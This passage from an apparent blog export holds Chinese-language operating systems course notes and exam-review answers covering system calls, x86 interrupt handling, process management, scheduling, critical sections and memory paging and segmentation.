<p>假设程序等待IO的时间占其运行时间比为p，n道程序同时等待的概率是$p^n$，那么CPU效率是$1-p^n$。</p>
<h2 id="批处理操作系统"><a href="#批处理操作系统" class="headerlink" title="批处理操作系统"></a>批处理操作系统</h2><p>作业是指把程序、数据连同作业说明书组织起来的任务单位</p>
<p>批作业是指把批中的作业预先输入作业队列，由操作系统按照说明来调度和控制作业执行，形成自动转接和连续处理作业。</p>
<p>特点：</p>
<ul>
<li>用户脱机工作</li>
<li>成批处理作业</li>
<li>多道程序运行</li>
<li>作业周转时间长</li>
</ul>
<h2 id="分时操作系统"><a href="#分时操作系统" class="headerlink" title="分时操作系统"></a>分时操作系统</h2><ul>
<li>多个联机用户同时使用一个计算机系统在各自的终端上进行交互式对话</li>
<li>程序、数据和命令都在会话过程中产生，通过问答方式控制程序</li>
<li>处理器分为时间片给不同用户</li>
</ul>
<h2 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h2><ul>
<li>外部事件产生时，快速处理</li>
</ul>
<hr>
<p>地址转换</p>
<p>2019-2-28</p>
<hr>
<h2 id="操作系统基本服务和用户接口"><a href="#操作系统基本服务和用户接口" class="headerlink" title="操作系统基本服务和用户接口"></a>操作系统基本服务和用户接口</h2><h3 id="基本服务和用户接口"><a href="#基本服务和用户接口" class="headerlink" title="基本服务和用户接口"></a>基本服务和用户接口</h3><p>基本服务</p>
<ul>
<li>创建程序</li>
<li>执行程序</li>
<li>数据IO</li>
<li>通信服务</li>
<li>错误检测和处理</li>
<li>资源分配、统计、保护</li>
</ul>
<h3 id="程序接口与系统调用"><a href="#程序接口与系统调用" class="headerlink" title="程序接口与系统调用"></a>程序接口与系统调用</h3><p>各种Linux版本之间相同点在于内核，内核只有版本号不一样。即内核版本相同的ubuntu和debian，能支持一样的软件。</p>
<p>用户态-&gt;内核态通过IDT，内核态-&gt;用户态iret</p>
<p>异常分类：</p>
<ul>
<li>故障(fault)：可恢复错误</li>
<li>陷阱(trap)：用户态-&gt;内核态</li>
<li>终止(abort)：不可恢复错误，不返回</li>
</ul>
<p>POSIX标准：<br>规定操作系统必须提供API，未规定接口的实现是采用系统调用、库函数还是其他形式。</p>
<p>函数库：</p>
<ul>
<li>静态库：编译时把库函数作为代码的一部分，生成bin</li>
<li>动态库/共享库：如DLL，编译时只给出入口地址，运行到这才加载</li>
</ul>
<p>系统调用时的过程、内核栈</p>
<p>区分系统调用过程中的中断向量号和系统调用号：压栈时取反再压</p>
<p>禁用一个syscall: sys_ni_syscall</p>
<p>添加一个syscall: 看ppt</p>
<h3 id="操作接口"><a href="#操作接口" class="headerlink" title="操作接口"></a>操作接口</h3><p>作业控制方式：</p>
<ul>
<li>联机：有命令行交互，人敲一句机器干一句/处理一个.bat文件</li>
<li>脱机：用JCL(job control language)语言把作业说明书塞给机器，然后人走了机器继续干活</li>
</ul>
<h3 id="系统程序"><a href="#系统程序" class="headerlink" title="系统程序"></a>系统程序</h3><p>运行于用户态</p>
<p>分类：</p>
<ul>
<li>文件管理</li>
<li>状态信息</li>
<li>对编程语言的支持</li>
</ul>
<h2 id="操作系统结构与运行模型"><a href="#操作系统结构与运行模型" class="headerlink" title="操作系统结构与运行模型"></a>操作系统结构与运行模型</h2><h3 id="结构分类"><a href="#结构分类" class="headerlink" title="结构分类"></a>结构分类</h3><ul>
<li>单体式：模块组合，互相接口，可以互相调用，数据是全程量，缺点：牵一发而动全身</li>
<li>层次式：分中断-内存-进程-IO（不全）等等多层，自下到顶</li>
<li>微内核：仅具有很少的必要功能，很小</li>
<li>虚拟机：用一个物理机模拟另一个物理机，通过分时使用管理多台机器。CMS?用户交互CMS，CMS交互硬件。</li>
</ul>
<p>原语不可中断</p>
<p>单内核功能多，效率高，但修改之后要重新编译<br>微内核容量小，额外功能都通过服务来完成，不用重新编译</p>
<p>Linux的做法：可加载内核模块，需要的时候像零件一样装上去拆下来，不用重新编译整个内核</p>
<h3 id="Linux中断处理"><a href="#Linux中断处理" class="headerlink" title="Linux中断处理"></a>Linux中断处理</h3><p>中断分快中断和慢中断</p>
<p>x86提供了15根 IRQ 线，但可以接入的设备不止15台，连到同一根 IRQ 线的设备有不同的<code>中断服务例程</code></p>
<p>最早的“下半部”实现机制：bottom half，静态创建，32个元素的链表，全局同步，不允许在任何两个 BH 同时执行</p>
]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>Operating System</tag>
      </tags>
  </entry>
  <entry>
    <title>OS讲课笔记</title>
    <url>/2020/07/10/OS%E8%AE%B2%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>OS讲课笔记</p>
<hr>
<h1 id="ch1-概论"><a href="#ch1-概论" class="headerlink" title="ch1 概论"></a>ch1 概论</h1><h2 id="需要掌握的问题"><a href="#需要掌握的问题" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>应用软件、支撑软件/系统软件、操作系统、硬件的层级关系</li>
<li>操作系统的两大功能是什么？</li>
<li>按功能和使用方式划分，操作系统有哪三种？</li>
<li>多道程序设计中，CPU的利用率怎么算？</li>
<li>多道程序设计提高了什么？损失了什么？</li>
<li>应用程序调用fprintf()之后，调用关系是怎样的？</li>
<li>系统调用的处理过程是怎样的？在用户态做了哪些事，在内核态做了哪些事？</li>
<li>系统调用和函数调用的区别？从调用方式/被调用代码位置/提供者回答</li>
<li>操作系统的三个基本元素是什么？</li>
<li>内核需要提供的4个基本功能是什么？</li>
<li>微内核和宏内核（也叫单内核）的优劣对比</li>
<li>微内核和宏内核的操作系统代表有哪些？</li>
<li>操作系统的功能在用户进程内执行的代表是？作为独立进程执行的代表是？</li>
</ol>
<h2 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h2><h3 id="1-应用软件、支撑软件-系统软件、操作系统、硬件的层级关系"><a href="#1-应用软件、支撑软件-系统软件、操作系统、硬件的层级关系" class="headerlink" title="1. 应用软件、支撑软件/系统软件、操作系统、硬件的层级关系"></a>1. 应用软件、支撑软件/系统软件、操作系统、硬件的层级关系</h3><p>知道那张层次图、知道系统软件是编译器、数据库</p>
<h3 id="2-操作系统的两大功能是什么？"><a href="#2-操作系统的两大功能是什么？" class="headerlink" title="2. 操作系统的两大功能是什么？"></a>2. 操作系统的两大功能是什么？</h3><p>对上层：提供资源抽象</p>
<p>对下层：管理硬件</p>
<h3 id="3-按功能和使用方式划分，操作系统有哪三种？"><a href="#3-按功能和使用方式划分，操作系统有哪三种？" class="headerlink" title="3. 按功能和使用方式划分，操作系统有哪三种？"></a>3. 按功能和使用方式划分，操作系统有哪三种？</h3><p>批处理操作系统、分时操作系统、实时操作系统</p>
<h3 id="4-多道程序设计中，CPU的利用率怎么算？"><a href="#4-多道程序设计中，CPU的利用率怎么算？" class="headerlink" title="4. 多道程序设计中，CPU的利用率怎么算？"></a>4. 多道程序设计中，CPU的利用率怎么算？</h3><p>那两张图会算就行，利用率 = CPU时间/一个作业周期时间</p>
<h3 id="5-多道程序设计提高了什么？损失了什么？"><a href="#5-多道程序设计提高了什么？损失了什么？" class="headerlink" title="5. 多道程序设计提高了什么？损失了什么？"></a>5. 多道程序设计提高了什么？损失了什么？</h3><p>提高了资源利用率，增加了用户响应时间</p>
<h3 id="6-应用程序调用fprintf-之后，调用关系是怎样的？"><a href="#6-应用程序调用fprintf-之后，调用关系是怎样的？" class="headerlink" title="6. 应用程序调用fprintf()之后，调用关系是怎样的？"></a>6. 应用程序调用fprintf()之后，调用关系是怎样的？</h3><p>C库的fprintf() -&gt; C库的write() -&gt; write系统调用 -&gt; sys_write处理函数</p>
<h3 id="7-系统调用的处理过程是怎样的？在用户态做了哪些事，在内核态做了哪些事？"><a href="#7-系统调用的处理过程是怎样的？在用户态做了哪些事，在内核态做了哪些事？" class="headerlink" title="7. 系统调用的处理过程是怎样的？在用户态做了哪些事，在内核态做了哪些事？"></a>7. 系统调用的处理过程是怎样的？在用户态做了哪些事，在内核态做了哪些事？</h3><ol>
<li>设置系统调用号和参数（用户态）</li>
<li>陷入内核态（内核态）</li>
<li>保护被中断进程的CPU环境，将处理机状态字PSW、程序计数器PC、系统调用号、用户栈指针以及通用寄存器内容等压入内核堆栈（内核态）</li>
<li>根据系统调用号，作为下标，查系统调用入口表（内核态）</li>
<li>转到对应的处理函数处理（内核态）</li>
<li>恢复被中断进程的现场（内核态）</li>
<li>返回用户态，继续执行被中断进程的下一条指令（用户态）</li>
</ol>
<h3 id="8-系统调用和函数调用的区别？从调用方式-被调用代码位置-提供者回答"><a href="#8-系统调用和函数调用的区别？从调用方式-被调用代码位置-提供者回答" class="headerlink" title="8. 系统调用和函数调用的区别？从调用方式/被调用代码位置/提供者回答"></a>8. 系统调用和函数调用的区别？从调用方式/被调用代码位置/提供者回答</h3><p>调用方式：系统调用是用trap/int调用，函数调用用call 函数名调用</p>
<p>被调代码位置：内核代码，进程代码</p>
<p>提供者：操作系统，编程语言</p>
<h3 id="9-操作系统的三个基本元素是什么？"><a href="#9-操作系统的三个基本元素是什么？" class="headerlink" title="9. 操作系统的三个基本元素是什么？"></a>9. 操作系统的三个基本元素是什么？</h3><p>内核、进程、线程</p>
<h3 id="10-内核需要提供的4个基本功能是什么？"><a href="#10-内核需要提供的4个基本功能是什么？" class="headerlink" title="10. 内核需要提供的4个基本功能是什么？"></a>10. 内核需要提供的4个基本功能是什么？</h3><p>中断管理、时钟管理、进程调度、原语管理</p>
<h3 id="11-微内核和宏内核（也叫单内核）的优劣对比"><a href="#11-微内核和宏内核（也叫单内核）的优劣对比" class="headerlink" title="11. 微内核和宏内核（也叫单内核）的优劣对比"></a>11. 微内核和宏内核（也叫单内核）的优劣对比</h3><p>微内核：灵活、独立、稳定、便于维护。但进程通信开销大，效率低</p>
<p>宏内核：效率高，但不稳定，不易维护</p>
<h3 id="12-微内核和宏内核的操作系统代表有哪些？各举1个"><a href="#12-微内核和宏内核的操作系统代表有哪些？各举1个" class="headerlink" title="12. 微内核和宏内核的操作系统代表有哪些？各举1个"></a>12. 微内核和宏内核的操作系统代表有哪些？各举1个</h3><p>微内核：Minix、QNX、Mach</p>
<p>宏内核：Linux、Unix</p>
<p>（另，windows和mac os都是宏内核，不过借鉴了微内核的设计思路，不是纯粹的宏内核，所以不做明确分类，如果考到了，写宏内核）</p>
<h3 id="13-操作系统的功能在用户进程内执行的代表是？作为独立进程执行的代表是？"><a href="#13-操作系统的功能在用户进程内执行的代表是？作为独立进程执行的代表是？" class="headerlink" title="13. 操作系统的功能在用户进程内执行的代表是？作为独立进程执行的代表是？"></a>13. 操作系统的功能在用户进程内执行的代表是？作为独立进程执行的代表是？</h3><p>在用户进程执行的：unix</p>
<p>作为独立进程执行的：windows</p>
<h1 id="ch2-处理器管理"><a href="#ch2-处理器管理" class="headerlink" title="ch2 处理器管理"></a>ch2 处理器管理</h1><p>处理器管理主要讲CPU的工作</p>
<h2 id="需要掌握的问题-1"><a href="#需要掌握的问题-1" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><p>处理器状态</p>
<ol>
<li>ESP、EBP 寄存器的功能</li>
<li>CS, DS, SS 寄存器分别是哪个段的描述符</li>
<li>CR0寄存器的PE位和PG位的功能</li>
<li>CR3寄存器的高20位存的是什么？为什么只使用高20位？</li>
<li>特权指令有哪些功能？</li>
<li>intel x86处理器有4个特权级别，用户态和内核态分别运行于哪一级？</li>
<li>程序状态字包含哪些内容？</li>
<li>EIP 存的是什么？</li>
</ol>
<hr>
<p>中断机制</p>
<ol>
<li>中断源的分类</li>
<li>中断的处理过程</li>
<li>异常的处理过程</li>
</ol>
<hr>
<p>进程</p>
<ol>
<li>进程的定义</li>
<li>进程的运行态，就绪态，等待态的切换图是怎样的？</li>
<li>进程的三个上下文是哪三个？</li>
<li>线程和进程的区别是什么？</li>
<li>fork和vfork的异同点</li>
<li>进程创建步骤</li>
<li>进程撤销步骤 exit</li>
<li>进程阻塞步骤</li>
<li>进程唤醒步骤</li>
</ol>
<hr>
<p>进程调度算法</p>
<ol>
<li>FCFS</li>
<li>SJF</li>
<li>SRTF</li>
<li>HRRF</li>
<li>时间片轮转算法</li>
</ol>
<h2 id="回答-1"><a href="#回答-1" class="headerlink" title="回答"></a>回答</h2><p>处理器状态</p>
<h3 id="1-ESP、EBP-寄存器的功能"><a href="#1-ESP、EBP-寄存器的功能" class="headerlink" title="1. ESP、EBP 寄存器的功能"></a>1. ESP、EBP 寄存器的功能</h3><p>ESP栈顶，EBP栈底</p>
<h3 id="2-CS-DS-SS-寄存器分别是哪个段的描述符"><a href="#2-CS-DS-SS-寄存器分别是哪个段的描述符" class="headerlink" title="2. CS, DS, SS 寄存器分别是哪个段的描述符"></a>2. CS, DS, SS 寄存器分别是哪个段的描述符</h3><p>代码段，数据段，栈段</p>
<h3 id="3-CR0寄存器的PE位和PG位的功能"><a href="#3-CR0寄存器的PE位和PG位的功能" class="headerlink" title="3. CR0寄存器的PE位和PG位的功能"></a>3. CR0寄存器的PE位和PG位的功能</h3><p>PE = 0：实模式，PE = 1：保护模式</p>
<p>PG = 0：不允许分页，PG = 1：开启分页</p>
<h3 id="4-CR3寄存器的高20位存的是什么？为什么只使用高20位？"><a href="#4-CR3寄存器的高20位存的是什么？为什么只使用高20位？" class="headerlink" title="4. CR3寄存器的高20位存的是什么？为什么只使用高20位？"></a>4. CR3寄存器的高20位存的是什么？为什么只使用高20位？</h3><p>存的是页目录表的物理地址。页目录表总是放在以4K字节为单位的存储器边界上，所以只用高20位。</p>
<h3 id="5-特权指令有哪些功能"><a href="#5-特权指令有哪些功能" class="headerlink" title="5. 特权指令有哪些功能"></a>5. 特权指令有哪些功能</h3><p>启动I/O设备、设置时钟、控制中断屏蔽位、清主存、建立存储键、加载PSW等</p>
<h3 id="6-intel-x86处理器有4个特权级别，用户态和内核态分别运行于哪一级？"><a href="#6-intel-x86处理器有4个特权级别，用户态和内核态分别运行于哪一级？" class="headerlink" title="6. intel x86处理器有4个特权级别，用户态和内核态分别运行于哪一级？"></a>6. intel x86处理器有4个特权级别，用户态和内核态分别运行于哪一级？</h3><p>用户3，内核0</p>
<h3 id="7-程序状态字包含哪些内容？"><a href="#7-程序状态字包含哪些内容？" class="headerlink" title="7. 程序状态字包含哪些内容？"></a>7. 程序状态字包含哪些内容？</h3><p>EFLAGS，EIP，处理器状态位（用户态3，内核态0），中断码，中断屏蔽位</p>
<h3 id="8-EIP-存的是什么？"><a href="#8-EIP-存的是什么？" class="headerlink" title="8. EIP 存的是什么？"></a>8. EIP 存的是什么？</h3><p>当前指令相对于当前段的偏移量</p>
<hr>
<p>中断机制</p>
<h3 id="1-中断源的分类"><a href="#1-中断源的分类" class="headerlink" title="1. 中断源的分类"></a>1. 中断源的分类</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200712195949146.png" alt="image-20200712195949146"></p>
<p>外中断是异步的，即随时可能发生，来自机器的端口，有IR0~IR7八根引脚，对应引发外中断的外设们</p>
<p>内中断是同步的，来自程序内部</p>
<p>内中断的执行可以被外中断打断，可以被内中断打断（即嵌套执行）</p>
<p>但外中断的执行不可被打断</p>
<h3 id="2-中断的过程"><a href="#2-中断的过程" class="headerlink" title="2. 中断的过程"></a>2. 中断的过程</h3><p>粗略来说</p>
<ol>
<li><p>产生中断向量</p>
</li>
<li><p>拿中断向量查表</p>
</li>
<li>保护现场</li>
<li>执行中断处理程序</li>
<li>恢复现场</li>
</ol>
<hr>
<p>细致来说</p>
<p>这里指在保护模式下的外中断，可以分为4步，中断请求-&gt;中断响应-&gt;中断处理-&gt;中断返回</p>
<p>中断请求：硬件向8259A可编程控制器发送中断请求，由8259A决定是否屏蔽该请求</p>
<p>中断响应：CPU看8259A控制器是否有中断请求，如果有，就去总线上取中断向量</p>
<p>中断处理：</p>
<ol>
<li>根据中断号查IDT（Interrupt Descriptor Table，中断描述符表），获得中断描述符（段选择符）</li>
<li>CPU使用IDT查到的中断服务程序的段选择符从GDT中取得相应的段描述符</li>
<li>CPU会根据当前cs寄存器里的CPL和GDT的段描述符的DPL，以确保中断服务程序是高于当前程序的，如果这次中断是编程异常（如：int 80h系统调用），那么还要检查CPL和IDT表中中断描述符的DPL，以保证当前程序有权限使用中断服务程序</li>
<li>CPU会根据CPL和中断服务程序段描述符的DPL信息确认是否发生了特权级的转换，比如当前程序正运行在用户态，而中断程序是运行在内核态的，则意味着发生了特权级的转换，这时CPU会从当前程序的TSS信息（该信息在内存中的首地址存在TR寄存器中）里取得该程序的内核栈地址，即包括ss和esp的值，并立即将系统当前使用的栈切换成新的栈。这个栈就是即将运行的中断服务程序要使用的栈。紧接着就将当前程序使用的<strong>ss,esp</strong>压到新栈中保存起来。</li>
<li>保护当前程序的现场：CPU开始利用栈保护被暂停执行的程序的现场：依次压入当前程序使用的eflags，cs，eip，errorCode（如果是有错误码的异常）信息</li>
<li>跳转到中断服务程序的第一条指令开始执行，CPU利用中断服务程序的段描述符将其第一条指令的地址加载到cs和eip寄存器中，开始执行中断服务程序。这意味着先前的程序被暂停执行，中断服务程序正式开始工作。</li>
<li>用iret指令返回用户态，程序执行这条返回指令时，会从栈里弹出先前保存的被暂停程序的现场信息，<strong>即eflags,cs,eip</strong>，被打断的程序继续执行</li>
</ol>
<h3 id="3-异常的处理过程"><a href="#3-异常的处理过程" class="headerlink" title="3. 异常的处理过程"></a>3. 异常的处理过程</h3><p>和中断仅有一处不同，就是中断的中断向量会从硬件处获取，即到总线上取，但异常的中断向量是程序给好的</p>
<hr>
<p>进程</p>
<h3 id="1-进程的定义"><a href="#1-进程的定义" class="headerlink" title="1. 进程的定义"></a>1. 进程的定义</h3><p>进程是<strong>可并发执行的程序</strong>在某个数据集合上的一次计算活动，也是操作系统进行<strong>资源分配和保护</strong>的基本单位</p>
<h3 id="2-进程的运行态，就绪态，等待态的切换图是怎样的？"><a href="#2-进程的运行态，就绪态，等待态的切换图是怎样的？" class="headerlink" title="2. 进程的运行态，就绪态，等待态的切换图是怎样的？"></a>2. 进程的运行态，就绪态，等待态的切换图是怎样的？</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200713001124681.png" alt="image-20200713001124681"></p>
<h3 id="3-进程的三个上下文是哪三个？"><a href="#3-进程的三个上下文是哪三个？" class="headerlink" title="3. 进程的三个上下文是哪三个？"></a>3. 进程的三个上下文是哪三个？</h3><p>用户级上下文：程序块、数据块、共享内存区、用户栈</p>
<p>系统级上下文：PCB、页表、段表、内核栈</p>
<p>寄存器上下文：处理器状态寄存器、EIP、ESP、EBP、通用寄存器（EAX、EBX、ECX、EDX）</p>
<h3 id="4-线程和进程的区别是什么？"><a href="#4-线程和进程的区别是什么？" class="headerlink" title="4. 线程和进程的区别是什么？"></a>4. 线程和进程的区别是什么？</h3><p>进程是操作系统进行资源分配和保护的单位，同一进程下的线程共享进程的资源</p>
<h3 id="5-fork和vfork的异同点"><a href="#5-fork和vfork的异同点" class="headerlink" title="5. fork和vfork的异同点"></a>5. fork和vfork的异同点</h3><p>fork创建子进程是独立于父进程的，与父进程互不干扰</p>
<p>vfork创建的子进程与父进程共享地址空间，共享页表，可看做父进程的一个线程</p>
<h3 id="6-进程创建步骤"><a href="#6-进程创建步骤" class="headerlink" title="6. 进程创建步骤"></a>6. 进程创建步骤</h3><ol>
<li>在进程列表中增加一项，从PCB池中申请一个空闲PCB，为新进程分配惟一的进程标识符</li>
<li>为新进程的进程映像分配地址空间</li>
<li>为新进程分配除主存空间外的其他各种所需资源</li>
<li>初始化PCB，如进程标识符、处理器初始状态、进程优先级等</li>
<li>把新进程状态置为就绪态，并移入就绪进程队列</li>
</ol>
<h3 id="7-进程撤销步骤"><a href="#7-进程撤销步骤" class="headerlink" title="7. 进程撤销步骤"></a>7. 进程撤销步骤</h3><ol>
<li>根据撤销进程标识号，从相应队列中找到并移出它</li>
<li>将该进程拥有的资源归还给父进程或操作系统</li>
<li>若该进程拥有子进程，先撤销所有子进程，以防它们脱离控制</li>
<li>回收PCB，并归还到PCB池</li>
</ol>
<h3 id="8-进程阻塞步骤"><a href="#8-进程阻塞步骤" class="headerlink" title="8. 进程阻塞步骤"></a>8. 进程阻塞步骤</h3><ol>
<li>停止进程执行，保存现场信息到PCB</li>
<li>修改进程PCB有关内容（如进程状态由运行态改为等待态等），并把修改状态后的进程移入相应事件的等待队列中</li>
<li>转入进程调度程序去调度其他进程运行</li>
</ol>
<h3 id="9-进程唤醒步骤"><a href="#9-进程唤醒步骤" class="headerlink" title="9. 进程唤醒步骤"></a>9. 进程唤醒步骤</h3><ol>
<li>从相应的等待队列中移出进程</li>
<li>修改进程PCB的有关信息（如进程状态改为就绪态），并移入就绪队列</li>
<li>若被唤醒进程比当前运行进程优先级高，重新设置调度标志</li>
</ol>
<hr>
<p>进程调度算法</p>
<h3 id="1-FCFS"><a href="#1-FCFS" class="headerlink" title="1. FCFS"></a>1. FCFS</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200713184107033.png" alt="image-20200713184107033"></p>
<h3 id="2-SJF"><a href="#2-SJF" class="headerlink" title="2. SJF"></a>2. SJF</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200713184120795.png" alt="image-20200713184120795"></p>
<p>​    </p>
<h3 id="3-SRTF"><a href="#3-SRTF" class="headerlink" title="3. SRTF"></a>3. SRTF</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200713184138232.png" alt="image-20200713184138232"></p>
<h3 id="4-HRRF"><a href="#4-HRRF" class="headerlink" title="4. HRRF"></a>4. HRRF</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200713184213280.png" alt=""></p>
<h3 id="5-时间片轮转算法"><a href="#5-时间片轮转算法" class="headerlink" title="5. 时间片轮转算法"></a>5. 时间片轮转算法</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200713184240441.png" alt="image-20200713184240441"></p>
<p>需要注意的是，如果在时间t时，一个进程的时间片耗尽，它按理要被放到队尾，但如果与此同时有一个新进程进来，它也要被放到队尾，那么谁先谁后呢？</p>
<p>答：应该是耗尽时间片的那个进程排在先，然后新进程排在队尾。原因是如果耗尽时间片的进程被放在后，假如在时间t进来很多个新进程，那么这个耗尽时间片的进程会被很多新进程“插队”，得等待很久</p>
<h1 id="ch3-并发进程管理"><a href="#ch3-并发进程管理" class="headerlink" title="ch3 并发进程管理"></a>ch3 并发进程管理</h1><h2 id="需要掌握的问题-2"><a href="#需要掌握的问题-2" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><p>并发进程和临界区管理</p>
<ol>
<li>Bernstein条件的判断</li>
<li>实现临界区管理的软件手段、硬件手段</li>
</ol>
<hr>
<p>信号量和PV操作（看ppt，oschap3）</p>
<ol>
<li>五个哲学家就餐问题</li>
<li>读者-写者问题</li>
<li>1个生产者-1个消费者-1单位缓冲区 的生产者-消费者问题</li>
<li>m个生产者-n个消费者-k单位缓冲区 的生产者-消费者问题</li>
<li>睡眠理发师问题</li>
<li>吸烟者问题</li>
<li>生产线装配问题</li>
<li>男女混用浴室问题</li>
<li>独木桥问题1234</li>
<li>安全岛问题</li>
</ol>
<hr>
<p>管程</p>
<p>霍尔管程解决</p>
<ol>
<li>生产者-消费者问题</li>
<li>五个哲学家就餐问题</li>
<li>睡眠理发师问题</li>
<li>吸烟者问题</li>
<li>生产线装配问题</li>
<li>文件读写问题</li>
</ol>
<hr>
<p>死锁</p>
<ol>
<li>死锁定义</li>
<li>死锁产生的4个必要条件</li>
<li>银行家算法</li>
<li>进程-资源分配图检测死锁法</li>
</ol>
<hr>
<p>进程通信</p>
<ol>
<li>信号机制</li>
<li>管道</li>
<li>消息队列</li>
<li>共享内存</li>
</ol>
<h2 id="回答-2"><a href="#回答-2" class="headerlink" title="回答"></a>回答</h2><p>并发进程和临界区管理</p>
<h3 id="1-Bernstein条件的判断实现"><a href="#1-Bernstein条件的判断实现" class="headerlink" title="1. Bernstein条件的判断实现"></a>1. Bernstein条件的判断实现</h3><p>P1的读和P2的写，P1的写和P2的读，P1的写和P2的写，不能有交集</p>
<h3 id="2-临界区管理的软件手段、硬件手段"><a href="#2-临界区管理的软件手段、硬件手段" class="headerlink" title="2. 临界区管理的软件手段、硬件手段"></a>2. 临界区管理的软件手段、硬件手段</h3><p>软件手段：Peterson算法</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200715220132205.png" alt="image-20200715220132205"></p>
<p>硬件手段：关中断、TS指令、SWAP指令</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200715220159736.png" alt="image-20200715220159736"></p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200715220214511.png" alt="image-20200715220214511"></p>
<hr>
<h1 id="ch4-存储管理"><a href="#ch4-存储管理" class="headerlink" title="ch4 存储管理"></a>ch4 存储管理</h1><h2 id="需要掌握的问题-3"><a href="#需要掌握的问题-3" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>存储管理的功能</li>
<li>存储器的层次金字塔长什么样</li>
<li>静态重定位、动态重定位、运行时链接地址重定位的概念区别</li>
<li>固定分区存储管理、可变分区管理的概念</li>
<li>分页式管理和地址转换、反置页表，要求会算</li>
<li>相联存储器和快表</li>
<li>分段式管理和地址转换、段表</li>
<li>分段和分页的比较</li>
<li>虚拟存储管理的概念</li>
<li>请求分页虚拟存储系统的基本原理</li>
<li>缺页中断率的影响因素、缺页中断的处理流程</li>
<li>页面替换策略算法</li>
<li>Belady异常是什么</li>
<li>伙伴系统的定义、分配和合并策略</li>
</ol>
<h2 id="回答-3"><a href="#回答-3" class="headerlink" title="回答"></a>回答</h2><h3 id="1-存储管理的功能"><a href="#1-存储管理的功能" class="headerlink" title="1. 存储管理的功能"></a>1. 存储管理的功能</h3><p>存储分配、地址抽象与映射、存储保护、存储共享</p>
<h3 id="2-存储器的层次金字塔长什么样"><a href="#2-存储器的层次金字塔长什么样" class="headerlink" title="2. 存储器的层次金字塔长什么样"></a>2. 存储器的层次金字塔长什么样</h3><p>自顶向下：</p>
<p>寄存器</p>
<p>cache</p>
<p>内存</p>
<p>磁盘缓存</p>
<p>磁盘</p>
<p>可移动存储介质</p>
<h3 id="3-静态重定位、动态重定位、运行时链接地址重定位的概念区别"><a href="#3-静态重定位、动态重定位、运行时链接地址重定位的概念区别" class="headerlink" title="3. 静态重定位、动态重定位、运行时链接地址重定位的概念区别"></a>3. 静态重定位、动态重定位、运行时链接地址重定位的概念区别</h3><p>静态重定位：装载程序将程序里的逻辑地址全部替换为物理地址</p>
<p>动态重定位：装载程序不修改程序里的任何逻辑地址，用一个重定位寄存器来做基址，访问逻辑地址时，物理地址=逻辑地址+重定位寄存器的值</p>
<p>运行时链接地址重定位：用页表和缺页中断来实现，当页面首次被引用时，产生缺页异常并且把对应页从磁盘装入内存</p>
<h3 id="4-固定分区存储管理、可变分区管理的概念"><a href="#4-固定分区存储管理、可变分区管理的概念" class="headerlink" title="4. 固定分区存储管理、可变分区管理的概念"></a>4. 固定分区存储管理、可变分区管理的概念</h3><p>固定分区存储管理：内存空间被划分为不同大小的区，但每个区的大小是固定的，每个区里装一个作业</p>
<p>可变分区存储管理：根据作业大小，划分不同大小的区给作业用</p>
<h3 id="5-分页式管理和地址转换、反置页表，要求会算"><a href="#5-分页式管理和地址转换、反置页表，要求会算" class="headerlink" title="5. 分页式管理和地址转换、反置页表，要求会算"></a>5. 分页式管理和地址转换、反置页表，要求会算</h3><p>页表：页表的尺寸是页号的数量，每次拿一个页号去查页表，查到页框号，然后拼接偏移量得到物理地址</p>
<p>反置页表：反置页表的尺寸是页框的数量，每次拿一个页号计算hash值，然后去访问反置页表，沿着链找到匹配的页号，然后将hash值拼接偏移量得到物理地址</p>
<h3 id="6-相联存储器和快表"><a href="#6-相联存储器和快表" class="headerlink" title="6. 相联存储器和快表"></a>6. 相联存储器和快表</h3><p>快表存在相联存储器里，拿页号去查快表，并行匹配得到页框号，拼接偏移量得到物理地址；或者匹配失败，还得去查页表，然后搬到快表里</p>
<h3 id="7-分段式管理和地址转换、段表"><a href="#7-分段式管理和地址转换、段表" class="headerlink" title="7. 分段式管理和地址转换、段表"></a>7. 分段式管理和地址转换、段表</h3><p>48位的逻辑地址=16位段寄存器+32位偏移量</p>
<p>用段寄存器里的13位作为下标去查段表，得到段描述符</p>
<p>从CS寄存器里取出CPL，CPL是当前进程的特权级，从段描述符里取出DPL和RPL，看是否满足CPL &lt;= DPL且CPL &lt;= RPL，满足就继续取段描述符里有段起始的虚拟地址（也称线性地址），不满足就产生GP异常</p>
<p>然后将这个起始地址拼接32位偏移量得到完整的32位虚拟地址，然后拿32位虚拟地址查页表（or快表-页表），得到物理地址</p>
<h3 id="8-分段和分页的比较"><a href="#8-分段和分页的比较" class="headerlink" title="8. 分段和分页的比较"></a>8. 分段和分页的比较</h3><p>分段，不同的段是有逻辑含义的，是用来有效利用虚拟空间的</p>
<p>分页，每一页是没有逻辑含义的，是用来有效利用物理内存的</p>
<h3 id="9-虚拟存储管理的概念"><a href="#9-虚拟存储管理的概念" class="headerlink" title="9. 虚拟存储管理的概念"></a>9. 虚拟存储管理的概念</h3><p>就是用了段表和页表</p>
<h3 id="10-请求分页虚拟存储系统的基本原理"><a href="#10-请求分页虚拟存储系统的基本原理" class="headerlink" title="10. 请求分页虚拟存储系统的基本原理"></a>10. 请求分页虚拟存储系统的基本原理</h3><p>分页式虚存不把作业信息(程序和数据)全部装入内存，仅装入立即使用的页面，在执行过程中访问到不在内存的页面时，产生缺页中断，再从磁盘动态地装入</p>
